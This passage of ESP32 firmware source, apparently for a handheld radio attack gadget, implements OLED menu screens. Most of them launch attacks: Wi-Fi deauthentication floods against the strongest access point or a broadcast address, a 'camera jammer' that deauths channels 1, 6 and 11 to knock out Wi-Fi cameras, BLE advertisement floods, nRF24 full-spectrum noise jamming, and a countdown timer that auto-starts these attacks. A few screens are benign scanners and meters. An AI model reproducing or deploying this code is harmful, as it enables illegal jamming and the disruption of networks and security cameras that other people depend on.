    for (int i = 1; i < ggWifiAPCount; i++)
      if (ggWifiAPs[i].rssi > ggWifiAPs[best].rssi) best = i;
    gJamCh = ggWifiAPs[best].channel;
    memcpy(ggWifiDeauthBssid, ggWifiAPs[best].bssid, 6);
    ggWifiPickScanEnd();
    ggClickFire();
    gAutoScanning = false;
    if (ggTrkBleReady) ggTrkScanEnd();
    if (ggCopRunning)  ggCopScanEnd();
    gWifiTx.channel = gJamCh; gWifiTx.pps = 1000; gWifiTx.power = GG_WP_MAX;
    ggWifiDeauthMode = true;
    ggWifiTxBegin(gWifiTx);
    gAutoWifiUp = true;
    gBleTx.pps = 500; gBleTx.power = GG_BP_MAX; gBleTx.channels = GG_BC_ALL; gBleTx.durationSec = 0;
    ggBleFloodMode = true;
    ggBleTxBegin(gBleTx);
    gAutoBleUp = true;
    ggFloodNrfStart(gJamCh);
    gAutoStartMs = millis(); gPhase = 0;
    return;
  }
  if (gEv.back) {
    ggFloodNrfStop();
    if (gAutoWifiUp) { ggWifiTxEnd(); gAutoWifiUp = false; }
    if (gAutoBleUp)  { ggBleFloodMode = false; ggBleTxEnd(); gAutoBleUp = false; }
    ggWifiDeauthMode = false;
    ggBack(); return;
  }
  if (ggBleFloodMode) ggBleFloodCycle();
  ggFloodNrfPump();
  static uint32_t lastAutoHop = 0;
  uint32_t now = millis();
  if (now - lastAutoHop >= 60) {
    lastAutoHop = now;
    static uint8_t autoCh = 1;
    autoCh++; if (autoCh > 14) autoCh = 1;
    gWifiTx.channel = autoCh;
    ggWifiTxSetChannel(autoCh, gWifiTx);
  }
  uint32_t elapsed = (millis()-gAutoStartMs)/1000;
  uint32_t wPkt = ggWifiPktCnt;
  uint32_t bPkt = ggBlePktEst();
  gPhase = (wPkt+bPkt)/100;
  ggOled.clearDisplay(); ggHeader("AUTO TARGET");
  ggBurstMark(14, 32, (int)(gPhase%1000));
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  ggOled.setCursor(34,18); ggOled.printf("CH%u STRONGEST", gJamCh);
  ggOled.setTextSize(2); ggOled.setCursor(34,28);
  ggOled.print(ggFmtCount(wPkt+bPkt));
  ggOled.setTextSize(1);
  { char wf[10],bf[10]; strncpy(wf,ggFmtCount(wPkt),9); wf[9]=0; strncpy(bf,ggFmtCount(bPkt),9); bf[9]=0; ggOled.setCursor(2,45); ggOled.printf("W:%s B:%s %lus",wf,bf,(unsigned long)elapsed); }
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.print("BACK=stop");
  ggOled.display();
}

// ---------------------------------------------------------------- WIFI HEATMAP
static bool gHeatDone = false;
static inline void ggScreenHeatmap() {
  if (!gRunInit) { memset(gHeatData, 0, sizeof(gHeatData)); gHeatCh = 0; gHeatDone = false; ggWifiPickScanBegin(); gRunInit = true; }
  if (gEv.back) { if (!gHeatDone) ggWifiPickScanEnd(); ggBack(); return; }
  if (!gHeatDone && ggWifiPickScanPoll()) {
    for (int i = 0; i < ggWifiAPCount; i++) {
      uint8_t ch = ggWifiAPs[i].channel;
      if (ch >= 1 && ch <= 14) gHeatData[ch-1]++;
    }
    ggWifiPickScanEnd();
    gHeatDone = true;
  }
  if (gEv.sel) { memset(gHeatData, 0, sizeof(gHeatData)); gHeatDone = false; ggWifiPickScanBegin(); }
  ggOled.clearDisplay(); ggHeader("HEATMAP");
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  for (int c = 0; c < 14; c++) {
    int x = 2 + c * 9;
    int h = gHeatData[c] * 4;
    if (h > 28) h = 28;
    if (h > 0) ggOled.fillRect(x, 44 - h, 7, h, SSD1306_WHITE);
    ggOled.setCursor(x, 46);
    if (c < 9) ggOled.printf("%d", c+1);
    else { char n[3]; snprintf(n,3,"%d",c+1); ggOled.print(n); }
  }
  ggOled.drawFastHLine(0,44,128,SSD1306_WHITE);
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.print("SEL=rescan  BACK");
  ggOled.display();
}

// ---------------------------------------------------------------- BAND OCCUPANCY (nRF spectrum)
static inline void ggScreenBandOcc() {
  if (!gRunInit) { memset(gNrfScan,0,sizeof(gNrfScan)); gScanPause=false; if(ggNrfToolP()){ggNrfTool().powerUp(); ggNrfTool().setAutoAck(false);} gRunInit=true; }
  if (gEv.back) { if(ggNrfToolP())ggNrfTool().stopListening(); ggBack(); return; }
  if (gEv.sel) gScanPause=!gScanPause;
  if (!gScanPause && ggNrfToolP()) ggNrfScanPass(ggNrfTool(), gNrfScan);
  ggOled.clearDisplay(); ggHeader("BAND OCC");
  for (int c = 0; c <= 125; c++) {
    int h = gNrfScan[c];
    if (h > 30) h = 30;
    if (h > 0) ggOled.drawFastVLine(c + 1, 44 - h, h, SSD1306_WHITE);
  }
  ggOled.drawFastHLine(0,44,128,SSD1306_WHITE);
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  ggOled.setCursor(2,46); ggOled.print("2400-----2483 MHz");
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.print(gScanPause?"SEL=run  BACK":"SEL=pause  BACK");
  ggOled.display();
}

// ---------------------------------------------------------------- PACKET RATE GRAPH
static inline void ggScreenPktRate() {
  if (!gRunInit) {
    if (ggTrkBleReady) ggTrkScanEnd();
    if (ggCopRunning) ggCopScanEnd();
    gPktRateCnt = 0; gPktRatePerSec = 0; gPktRateOn = false;
    WiFi.mode(WIFI_STA); WiFi.disconnect(); delay(50);
    { wifi_country_t cty={"XX",1,14,78,WIFI_COUNTRY_POLICY_MANUAL}; esp_wifi_set_country(&cty); }
    esp_wifi_set_promiscuous_rx_cb(ggPktRateSniffCb);
    esp_wifi_set_promiscuous(true);
    gPktRateOn = true;
    gPktRateLastMs = millis();
    gRunInit = true;
  }
  if (gEv.back) {
    if (gPktRateOn) { esp_wifi_set_promiscuous(false); WiFi.mode(WIFI_OFF); gPktRateOn = false; }
    ggBack(); return;
  }
  if (gEv.sel) { gPktRateCnt = 0; gPktRatePerSec = 0; }
  uint32_t now = millis();
  if (now - gPktRateLastMs >= 1000) {
    gPktRatePerSec = (uint16_t)(gPktRateCnt * 1000 / (now - gPktRateLastMs));
    gPktRateCnt = 0;
    gPktRateLastMs = now;
  }
  ggOled.clearDisplay(); ggHeader("PKT RATE");
  ggOled.setTextColor(SSD1306_WHITE);
  ggOled.setTextSize(2); ggOled.setCursor(2,20); ggOled.printf("%u", gPktRatePerSec); ggOled.setTextSize(1);
  ggOled.setCursor(80,24); ggOled.print("pkt/s");
  int barW = gPktRatePerSec / 10;
  if (barW > 120) barW = 120;
  ggOled.fillRect(2, 40, barW, 8, SSD1306_WHITE);
  ggOled.drawRect(2, 40, 120, 8, SSD1306_WHITE);
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.print("BACK=stop  SEL=reset");
  ggOled.display();
}

// ---------------------------------------------------------------- ATTACK TIMER
static const char* const ATK_TYPES[] = { "Full Jam", "Beacon Spam", "BLE Spam" };
static inline void ggScreenAtkTimer() {
  if (!gAtkTimerArmed) {
    if (gEv.back) { ggBack(); return; }
    if (gEv.up) {
      if (gEditing) { int v=(int)gAtkTimerSec+10; if(v>300)v=300; gAtkTimerSec=(uint16_t)v; }
      else ggStepU8(gSel, -1, 0, 2);
    }
    if (gEv.down) {
      if (gEditing) { int v=(int)gAtkTimerSec-10; if(v<10)v=10; gAtkTimerSec=(uint16_t)v; }
      else ggStepU8(gSel, +1, 0, 2);
    }
    if (gEv.sel) {
      if (gSel == 0) { gAtkTimerType = (gAtkTimerType + 1) % 3; }
      else if (gSel == 1) { gEditing = !gEditing; }
      else { gAtkTimerArmed = true; gAtkTimerStart = millis(); ggClickFire(); }
    }
    ggOled.clearDisplay(); ggHeader("ATK TIMER");
    ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
    static char r0[22], r1[22], r2[22];
    snprintf(r0,22,"Attack: %s", ATK_TYPES[gAtkTimerType]);
    snprintf(r1,22,"Delay: %u sec", gAtkTimerSec);
    snprintf(r2,22,"ARM >");
    const char* p[] = {r0, r1, r2};
    const char* hints[] = {"SEL=cycle type","UP/DN delay  SEL ok","SEL=start countdown"};
    ggMenu("ATK TIMER", p, 3, gSel, gTop, gEditing?"UP/DN change  SEL ok":hints[gSel]);
  } else {
    uint32_t elapsed = (millis()-gAtkTimerStart)/1000;
    if (elapsed >= gAtkTimerSec) {
      gAtkTimerArmed = false;
      switch (gAtkTimerType) {
        case 0: gJamCh = 1; ggBack(); ggGo(GS_JAM_RUN); break;
        case 1: ggBack(); ggGo(GS_SPAM_RUN); break;
        case 2: ggBleSpamProto = GG_BSP_APPLE; ggBack(); ggGo(GS_BLESPAM_RUN); break;
      }
      return;
    }
    if (gEv.back) { gAtkTimerArmed = false; ggBack(); return; }
    uint32_t left = gAtkTimerSec - elapsed;
    ggOled.clearDisplay(); ggHeader("ATK TIMER");
    ggOled.setTextColor(SSD1306_WHITE);
    ggOled.setCursor(2,18); ggOled.printf("Attack: %s", ATK_TYPES[gAtkTimerType]);
    ggOled.setTextSize(2); ggOled.setCursor(34,28); ggOled.printf("%lus",(unsigned long)left); ggOled.setTextSize(1);
    ggOled.setCursor(2,45); ggOled.print("Auto-starts when 0");
    ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
    ggOled.setCursor(2,56); ggOled.print("BACK=disarm");
    ggOled.display();
  }
}

// ---------------------------------------------------------------- BYTE / TEXT editor
//  UP/DOWN change the highlighted byte. Tap SELECT = next byte (wraps). On the
//  PAYLOAD editor (gBLenPtr set) HOLD SELECT = add a byte on the end, so growing
//  a payload is one gesture. BACK keeps everything you typed (saved in place).
static inline void ggScreenBytes() {
  if (gBAscii) {   // text: scroll printable chars only (easy typing)
    if (gEv.up)   gBBuf[gBIdx] = (gBBuf[gBIdx] < 126) ? gBBuf[gBIdx]+1 : 32;
    if (gEv.down) gBBuf[gBIdx] = (gBBuf[gBIdx] > 32)  ? gBBuf[gBIdx]-1 : 126;
  } else {
    if (gEv.up)   gBBuf[gBIdx]++;
    if (gEv.down) gBBuf[gBIdx]--;
  }
  if (gEv.selLong && gBLenPtr && gBN < gBLenMax) {     // hold SELECT = add a byte
    gBN++; *gBLenPtr = gBN; gBBuf[gBN-1] = gBAscii ? ' ' : 0x00; gBIdx = gBN-1;
  } else if (gEv.sel) {
    gBIdx = (gBIdx + 1) % (gBN ? gBN : 1);             // tap = next byte
  }
  if (gEv.back){ ggBack(); return; }
  ggOled.clearDisplay(); ggHeader(gBTitle);
  // compact 8-wide grid: rows at y16/25/34/43 so a full 32 bytes clear the hint
  for(int i=0;i<gBN;i++){ int col=i%8,row=i/8,x=2+col*15,y=16+row*9;
    if(i==gBIdx){ ggOled.fillRect(x-1,y-1,15,9,SSD1306_WHITE); ggOled.setTextColor(SSD1306_BLACK);} else ggOled.setTextColor(SSD1306_WHITE);
    ggOled.setCursor(x,y); ggOled.printf("%02X",gBBuf[i]); }
  int usedRows=(gBN+7)/8; int py=16+usedRows*9+1;      // just under the grid
  if (gBAscii && py<=45){ ggOled.setTextColor(SSD1306_WHITE); ggOled.setCursor(2,py); ggOled.print("\"");
    for(int i=0;i<gBN&&i<20;i++){ char c=gBBuf[i]; ggOled.write((c>=32&&c<127)?c:'.'); } ggOled.print("\""); }
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE); ggOled.setCursor(2,56);
  ggOled.print(gBLenPtr ? "SEL=next  hold=+byte" : (gBAscii?"UP/DN char  SEL=next":"UP/DN val  SEL=next"));
  ggOled.display();
}

// ---------------------------------------------------------------- MY PAYLOADS (library)
static inline void ggPayPreview(uint8_t i, char* out, size_t n) {
  if (!ggPaySlotUsed(i)) { snprintf(out,n,"%u  (empty)", i+1); return; }
  GgPayload p; if (!ggPayLoad(i,p)) { snprintf(out,n,"%u  (error)", i+1); return; }
  if (p.len<1||p.len>GG_PAYLOAD_MAX) p.len=1;
  if (p.kind==GG_PL_TEXT) {
    char t[13]; uint8_t m=p.len>12?12:p.len, j=0;
    for (; j<m; j++){ char c=p.bytes[j]; t[j]=(c>=32&&c<127)?c:'.'; } t[j]=0;
    snprintf(out,n,"%u \"%s\"", i+1, t);
  } else {
    snprintf(out,n,"%u %02X%02X..(%uB)", i+1, p.bytes[0], p.len>1?p.bytes[1]:0, p.len);
  }
}
static inline void ggScreenPayLib() {
  if (gEv.up)   ggStepU8(gPaySlot,-1,0,GG_PAYLIB_SLOTS-1);
  if (gEv.down) ggStepU8(gPaySlot,+1,0,GG_PAYLIB_SLOTS-1);
  if (gEv.back){ ggBack(); return; }
  if (gEv.sel){ gSel=0; ggGo(GS_PAYACT); return; }
  static char rows[GG_PAYLIB_SLOTS][22]; const char* p[GG_PAYLIB_SLOTS];
  for(int i=0;i<GG_PAYLIB_SLOTS;i++){ ggPayPreview(i,rows[i],22); p[i]=rows[i]; }
  int top=gPaySlot<4?0:gPaySlot-3;
  ggMenu("My payloads", p, GG_PAYLIB_SLOTS, gPaySlot, top, "SEL=open  BACK");
}
static const char* const PAY_USED[]  = { "Load & send >", "Load only", "Overwrite", "Delete" };
static const char* const PAY_EMPTY[] = { "Save current here" };
// Apply a saved entry - bytes AND its send settings - onto a radio profile.
static inline void ggPayApply(const GgPayload& p, GgNrfProfile& dst){
  dst.plKind = (p.kind==GG_PL_TEXT)?GG_PL_TEXT:GG_PL_HEX;
  dst.plLen  = (p.len<1||p.len>GG_PAYLOAD_MAX)?8:p.len;
  memcpy(dst.payload, p.bytes, GG_PAYLOAD_MAX);
  dst.rate       = (p.rate  > GG_DR_2M)  ? (uint8_t)GG_DR_1M  : p.rate;
  dst.power      = (p.power > GG_PWR_MAX) ? (uint8_t)GG_PWR_LOW : p.power;
  dst.channel    = (p.channel > GG_NRF_CH_MAX) ? (uint8_t)76 : p.channel;
  dst.burstN     = (p.amount<1)?1:(p.amount>2000?2000:p.amount);
  dst.burstGapMs = (p.gapMs>2000)?2000:p.gapMs;
}
// Snapshot the CURRENT transmit config (bytes + how it sends) into a slot record.
static inline GgPayload ggPayCapture(const GgNrfProfile& s){
  GgPayload c{};
  c.kind    = (s.plKind==GG_PL_TEXT)?GG_PL_TEXT:GG_PL_HEX;
  c.len     = (s.plLen<1||s.plLen>GG_PAYLOAD_MAX)?1:s.plLen;
  memcpy(c.bytes, s.payload, GG_PAYLOAD_MAX);
  c.rate    = s.rate; c.power = s.power; c.channel = s.channel;
  c.amount  = s.burstN; c.gapMs = s.burstGapMs;
  return c;
}
static inline void ggScreenPayAct() {
  bool used = ggPaySlotUsed(gPaySlot); int cnt = used?4:1;
  ggMove(0, cnt-1);
  if (gEv.back){ ggBack(); return; }
  if (gEv.sel) {
    GgPayload cur = ggPayCapture(*gNrfCfg);                           // current send, for save/overwrite
    if (!used) { ggPaySave(gPaySlot, cur); ggBack(); return; }        // empty slot: save
    GgPayload p; bool ok = ggPayLoad(gPaySlot, p);
    if (gSel==0) {                                                    // Load & send
      if (ok){ ggPayApply(p, gNrfA); gNrfCfg=&gNrfA; ggSaveLive(gNrfA,gNrfB); gAutoFire=true; }
      ggGo(GS_NRF_TX); return;                                        // jump to send + auto-fire
    }
    if (gSel==1) { if(ok) ggPayApply(p, *gNrfCfg); ggBack(); return; }// Load only
    if (gSel==2) { ggPaySave(gPaySlot, cur);       ggBack(); return; }// Overwrite
    if (gSel==3) { ggPayErase(gPaySlot);           ggBack(); return; }// Delete
  }
  char t[18]; snprintf(t,sizeof(t),"Payload %u",gPaySlot+1);
  int lt=0; ggMenu(t, used?PAY_USED:PAY_EMPTY, cnt, gSel, lt, used?"into your transmit":"saves current bytes");
}

// ---------------------------------------------------------------- BLACKOUT
// ---------------------------------------------------------------- WiFi+BLE COMBO FLOOD
static bool     gWBWifiUp = false, gWBBleUp = false;
static uint32_t gWBStartMs = 0;
static inline void ggScreenWifiBleRun() {
  if (!gRunInit) {
    if (ggTrkBleReady) ggTrkScanEnd();
    if (ggCopRunning)  ggCopScanEnd();
    gWifiTx.channel = 1; gWifiTx.pps = 1000; gWifiTx.power = GG_WP_MAX;
    memset(ggWifiDeauthBssid, 0xFF, 6);
    ggWifiDeauthMode = true;
    ggWifiTxBegin(gWifiTx);
    gWBWifiUp = true;
    gBleTx.pps = 500; gBleTx.power = GG_BP_MAX; gBleTx.channels = GG_BC_ALL; gBleTx.durationSec = 0;
    ggBleFloodMode = true;
    ggBleTxBegin(gBleTx);
    gWBBleUp = true;
    gWBStartMs = millis(); gPhase = 0; gRunInit = true;
  }
  if (gEv.back) {
    if (gWBWifiUp) { ggWifiTxEnd(); gWBWifiUp = false; }
    if (gWBBleUp)  { ggBleFloodMode = false; ggBleTxEnd(); gWBBleUp = false; }
    ggWifiDeauthMode = false;
    ggBack(); return;
  }
  if (ggBleFloodMode) ggBleFloodCycle();
  { static uint32_t lastHop=0; static uint8_t hopCh=1; uint32_t n2=millis();
    if (n2-lastHop>=50) { lastHop=n2; hopCh++; if(hopCh>14)hopCh=1;
    gWifiTx.channel=hopCh; ggWifiTxSetChannel(hopCh, gWifiTx); } }
  uint32_t elapsed = (millis()-gWBStartMs)/1000;
  uint32_t wPkt = ggWifiPktCnt, bPkt = ggBlePktEst();
  gPhase = (wPkt+bPkt)/100;
  ggOled.clearDisplay(); ggHeader("WiFi+BLE");
  ggBurstMark(14, 32, (int)(gPhase%1000));
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  ggOled.setCursor(34,18); ggOled.printf("WiFi CH%u", gWifiTx.channel);
  ggOled.setTextSize(2); ggOled.setCursor(34,28);
  ggOled.print(ggFmtCount(wPkt+bPkt));
  ggOled.setTextSize(1);
  { char wf[10],bf[10]; strncpy(wf,ggFmtCount(wPkt),9); wf[9]=0; strncpy(bf,ggFmtCount(bPkt),9); bf[9]=0;
    ggOled.setCursor(2,45); ggOled.printf("W:%s  B:%s",wf,bf); }
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.printf("BACK=stop  %lus",(unsigned long)elapsed);
  ggOled.display();
}

// ---------------------------------------------------------------- BLE+nRF COMBO FLOOD
static bool     gBNBleUp = false;
static uint32_t gBNStartMs = 0;
static inline void ggScreenBleNrfRun() {
  if (!gRunInit) {
    if (ggTrkBleReady) ggTrkScanEnd();
    if (ggCopRunning)  ggCopScanEnd();
    gBleTx.pps = 500; gBleTx.power = GG_BP_MAX; gBleTx.channels = GG_BC_ALL; gBleTx.durationSec = 0;
    ggBleFloodMode = true;
    ggBleTxBegin(gBleTx);
    gBNBleUp = true;
    ggBleFloodNrfStart();
    gBNStartMs = millis(); gPhase = 0; gRunInit = true;
  }
  if (gEv.back) {
    ggFloodNrfStop();
    if (gBNBleUp) { ggBleFloodMode = false; ggBleTxEnd(); gBNBleUp = false; }
    ggBack(); return;
  }
  if (ggBleFloodMode) ggBleFloodCycle();
  ggFloodNrfPump();
  uint32_t elapsed = (millis()-gBNStartMs)/1000;
  uint32_t bPkt = ggBlePktEst();
  gPhase = bPkt/100;
  ggOled.clearDisplay(); ggHeader("BLE+nRF");
  ggBurstMark(14, 32, (int)(gPhase%1000));
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  ggOled.setCursor(34,18); ggOled.print("BLE all + nRF 0-83");
  ggOled.setTextSize(2); ggOled.setCursor(34,28);
  ggOled.print(ggFmtCount(bPkt));
  ggOled.setTextSize(1);
  ggOled.setCursor(2,45); ggOled.printf("BLE:%s  nRF:flood",ggFmtCount(bPkt));
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.printf("BACK=stop  %lus",(unsigned long)elapsed);
  ggOled.display();
}

// ---------------------------------------------------------------- nRF FULL SPECTRUM JAM
static uint32_t gNrfJamStartMs = 0;
static inline void ggScreenNrfJam() {
  if (!gRunInit) {
    ggFloodNrfChLo = 0; ggFloodNrfChHi = 125;
    ggFloodNrfPosA = 0; ggFloodNrfPosB = 63;
    if (ggNrfPresentA) ggNrfNoiseBegin(ggNrfA, 0);
    if (ggNrfPresentB) ggNrfNoiseBegin(ggNrfB, 63);
    ggFloodNrfActive = true;
    gNrfJamStartMs = millis(); gRunInit = true;
  }
  if (gEv.back) {
    ggFloodNrfStop();
    ggBack(); return;
  }
  ggFloodNrfPump();
  uint32_t elapsed = (millis()-gNrfJamStartMs)/1000;
  ggOled.clearDisplay(); ggHeader("nRF JAM");
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  ggOled.setCursor(2,18); ggOled.print("Full spectrum noise");
  ggOled.setCursor(2,27); ggOled.printf("CH 0-125  (%s)", ggNrfPresentA&&ggNrfPresentB?"2 radios":"1 radio");
  ggOled.setCursor(2,36); ggOled.printf("Pos A:%u  B:%u", ggFloodNrfPosA, ggFloodNrfPosB);
  ggOled.setCursor(2,45); ggOled.printf("Running %lus",(unsigned long)elapsed);
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.print("BACK=stop");
  ggOled.display();
}

// ---------------------------------------------------------------- HIDDEN NETWORK SCANNER
static uint8_t  gHiddenCount = 0;
static uint32_t gHiddenLastMs = 0;
static bool     gHiddenScanning = false;
static char     gHiddenBssids[8][18];
static uint8_t  gHiddenChannels[8];
static int8_t   gHiddenRssi[8];
static inline void ggScreenHiddenScan() {
  if (!gRunInit) {
    if (ggTrkBleReady) ggTrkScanEnd();
    if (ggCopRunning) ggCopScanEnd();
    gHiddenCount = 0; gHiddenScanning = false;
    WiFi.mode(WIFI_STA); WiFi.disconnect(); delay(30);
    { wifi_country_t cty={"XX",1,14,78,WIFI_COUNTRY_POLICY_MANUAL}; esp_wifi_set_country(&cty); }
    WiFi.scanNetworks(true, true);
    gHiddenScanning = true;
    gHiddenLastMs = millis();
    gRunInit = true;
  }
  if (gEv.back) {
    if (gHiddenScanning) { WiFi.scanDelete(); WiFi.mode(WIFI_OFF); gHiddenScanning = false; }
    ggBack(); return;
  }
  if (gHiddenScanning) {
    int r = WiFi.scanComplete();
    if (r >= 0) {
      gHiddenCount = 0;
      for (int i = 0; i < r && gHiddenCount < 8; i++) {
        if (WiFi.SSID(i).length() == 0) {
          uint8_t* b = WiFi.BSSID(i);
          if (!b) continue;
          snprintf(gHiddenBssids[gHiddenCount], 18, "%02X:%02X:%02X:%02X:%02X:%02X", b[0],b[1],b[2],b[3],b[4],b[5]);
          gHiddenChannels[gHiddenCount] = WiFi.channel(i);
          gHiddenRssi[gHiddenCount] = WiFi.RSSI(i);
          gHiddenCount++;
        }
      }
      WiFi.scanDelete();
      WiFi.scanNetworks(true, true);
      gHiddenLastMs = millis();
    } else if (r == WIFI_SCAN_FAILED) {
      WiFi.scanNetworks(true, true);
    }
  }
  ggOled.clearDisplay(); ggHeader("HIDDEN SCAN");
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  if (gHiddenCount == 0) {
    ggOled.setCursor(2,25); ggOled.print("Scanning...");
    ggOled.setCursor(2,35); ggOled.print("No hidden APs yet");
  } else {
    for (uint8_t i = 0; i < gHiddenCount && i < 4; i++) {
      int y = 18 + i * 9;
      ggOled.setCursor(2, y);
      ggOled.printf("CH%u %ddB", gHiddenChannels[i], gHiddenRssi[i]);
      ggOled.setCursor(60, y);
      ggOled.print(gHiddenBssids[i] + 9);
    }
  }
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.printf("Found:%u  BACK=stop", gHiddenCount);
  ggOled.display();
}

// ---------------------------------------------------------------- CAMERA JAMMER
static bool     gCamJamWifiUp = false;
static uint32_t gCamJamStartMs = 0;
static inline void ggScreenCameraJam() {
  if (!gRunInit) {
    if (ggTrkBleReady) ggTrkScanEnd();
    if (ggCopRunning)  ggCopScanEnd();
    gWifiTx.channel = 1; gWifiTx.pps = 1000; gWifiTx.power = GG_WP_MAX;
    memset(ggWifiDeauthBssid, 0xFF, 6);
    ggWifiDeauthMode = true;
    ggWifiTxBegin(gWifiTx);
    gCamJamWifiUp = true;
    gCamJamStartMs = millis(); gPhase = 0; gRunInit = true;
  }
  if (gEv.back) {
    if (gCamJamWifiUp) { ggWifiTxEnd(); gCamJamWifiUp = false; }
    ggWifiDeauthMode = false;
    ggBack(); return;
  }
  static const uint8_t camChs[] = {1, 6, 11};
  { static uint32_t lastHop=0; static uint8_t hopIdx=0; uint32_t n2=millis();
    if (n2-lastHop>=80) { lastHop=n2; hopIdx=(hopIdx+1)%3;
    gWifiTx.channel=camChs[hopIdx]; ggWifiTxSetChannel(camChs[hopIdx], gWifiTx); } }
  uint32_t elapsed = (millis()-gCamJamStartMs)/1000;
  uint32_t wPkt = ggWifiPktCnt;
  gPhase = wPkt/100;
  ggOled.clearDisplay(); ggHeader("CAM JAM");
  ggBurstMark(14, 32, (int)(gPhase%1000));
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  ggOled.setCursor(34,18); ggOled.printf("CH 1/6/11 (now:%u)", gWifiTx.channel);
  ggOled.setTextSize(2); ggOled.setCursor(34,28);
  ggOled.print(ggFmtCount(wPkt));
  ggOled.setTextSize(1);
  ggOled.setCursor(2,45); ggOled.print("Targeting WiFi cams");
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.printf("BACK=stop  %lus",(unsigned long)elapsed);
  ggOled.display();
}

// ---------------------------------------------------------------- SIGNAL METER
static int8_t   gSigRssi[8];
static char     gSigSsid[8][11];
static uint8_t  gSigCount = 0;
static bool     gSigScanning = false;
static inline void ggScreenSignalMeter() {
  if (!gRunInit) {
    if (ggTrkBleReady) ggTrkScanEnd();
    if (ggCopRunning) ggCopScanEnd();
    gSigCount = 0; gSigScanning = false;
    WiFi.mode(WIFI_STA); WiFi.disconnect(); delay(30);
    { wifi_country_t cty={"XX",1,14,78,WIFI_COUNTRY_POLICY_MANUAL}; esp_wifi_set_country(&cty); }
    WiFi.scanNetworks(true, true);
    gSigScanning = true;
    gRunInit = true;
  }
  if (gEv.back) {
    if (gSigScanning) { WiFi.scanDelete(); WiFi.mode(WIFI_OFF); gSigScanning = false; }
    ggBack(); return;
  }
  if (gEv.sel) {
    WiFi.scanDelete();
    WiFi.scanNetworks(true, true);
  }
  if (gSigScanning) {
    int r = WiFi.scanComplete();
    if (r >= 0) {
      gSigCount = 0;
      for (int i = 0; i < r && i < 128; i++) {
        int8_t rssi = WiFi.RSSI(i);
        uint8_t pos = gSigCount;
        if (gSigCount < 8) { gSigCount++; }
        else {
          int8_t weakest = gSigRssi[0]; pos = 0;
          for (uint8_t j = 1; j < 8; j++) { if (gSigRssi[j] < weakest) { weakest = gSigRssi[j]; pos = j; } }
          if (rssi <= weakest) continue;
        }
        gSigRssi[pos] = rssi;
        String ss = WiFi.SSID(i);
        if (ss.length() == 0) strncpy(gSigSsid[pos], "(hidden)", 10);
        else { strncpy(gSigSsid[pos], ss.c_str(), 10); }
        gSigSsid[pos][10] = 0;
      }
      WiFi.scanDelete();
      WiFi.scanNetworks(true, true);
    } else if (r == WIFI_SCAN_FAILED) {
      WiFi.scanNetworks(true, true);
    }
  }
  ggOled.clearDisplay(); ggHeader("SIGNAL");
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  for (uint8_t i = 0; i < gSigCount && i < 4; i++) {
    int y = 18 + i * 9;
    ggOled.setCursor(2, y);
    ggOled.print(gSigSsid[i]);
    int barW = (gSigRssi[i] + 100);
    if (barW < 0) barW = 0; if (barW > 60) barW = 60;
    ggOled.fillRect(66, y, barW, 7, SSD1306_WHITE);
    ggOled.setCursor(66 + barW + 2, y);
    ggOled.printf("%d", gSigRssi[i]);
  }
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.printf("APs:%u  SEL=rescan", gSigCount);
  ggOled.display();
}

// ---------------------------------------------------------------- R40T MODE
static inline void ggScreenR40tMode() {
  if (gEv.back) { ggBack(); return; }
  if (gEv.swap && ggR40tCtrlMode) {
    ggButtonTarget = 0;
    ggR40tCtrlMode = false;
    ggLinkSendButtonRoute(0);
    ggClickOk();
  }
  if (gEv.sel) {
    ggButtonTarget = (ggButtonTarget == 0) ? 2 : 0;
    ggR40tCtrlMode = (ggButtonTarget == 2);
    ggLinkSendButtonRoute(ggButtonTarget);
    ggClickOk();
  }
  ggOled.clearDisplay(); ggHeader("R40T Mode");
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  ggOled.setCursor(2,18);
  ggOled.print(F("R40T: "));
  ggOled.print(ggLinkR40tUp ? F("ONLINE") : F("OFFLINE"));
  ggOled.setCursor(2,28);
  ggOled.print(F("Buttons -> "));
  ggOled.print(ggButtonTarget == 2 ? F("R40T") : F("LOCAL"));
  ggOled.setCursor(2,40);
  if (ggLinkR40tUp) ggOled.printf("SD:%uMB  H:%u", ggR40tSdFreeMb, ggR40tHeapFree);
  else ggOled.print(F("Waiting for R40T..."));
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56);
  if (ggR40tCtrlMode) ggOled.print(F("SWAP=local"));
  else                ggOled.print(F("SEL=toggle  BACK=exit"));
  ggOled.display();
}

static uint32_t gBlackoutStartMs = 0;
static bool     gBlackoutWifiUp  = false;
static bool     gBlackoutBleUp   = false;
static inline void ggScreenBlackout() {
  if (!gRunInit) {
    if (ggTrkBleReady) ggTrkScanEnd();
    if (ggCopRunning)  ggCopScanEnd();
    gWifiTx.channel = 1; gWifiTx.pps = 1000; gWifiTx.power = GG_WP_MAX;
